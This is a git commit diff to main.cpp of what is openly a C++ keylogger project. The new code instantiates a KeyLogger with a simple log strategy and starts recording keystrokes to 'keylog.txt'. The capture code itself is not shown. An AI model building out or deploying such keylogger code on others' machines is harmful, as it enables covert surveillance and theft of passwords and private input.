3730f9469f38fe2e2f01a35d6ebfafe624dd5c1d
sebitse <sebastian.tonu14@gmail.com>
2024-09-02 15:49:56 +0300

    update the main in order to run a simple log strategy

--- src/main.cpp
+++ src/main.cpp
@@ -1,7 +1,28 @@
+#include <iostream>
 #include "../include/KeyLogger.h"
 
-int main() 
+//#define SIMPLELOG_H
+#include "../include/SimpleLogStrategy.h"
+#define ENCRYPTEDLOG_H
+#include "../include/EncryptedLogStrategy.h"
+#define FORMATTEDLOG_H
+#include "../include/FormattedLogStrategy.h"
+
+int main(void) 
 {
-    
+    KeyLogger logger;
+
+    SimpleLogStrategy simpleStrategy;
+    logger.setLogStrategy(&simpleStrategy);
+
+    if (logger.openLogFile("keylog.txt")) 
+    {
+        logger.start();
+    } 
+    else 
+    {
+        std::cerr << "Failed to open log file" << std::endl;
+    }
+
     return EXIT_SUCCESS;
 }
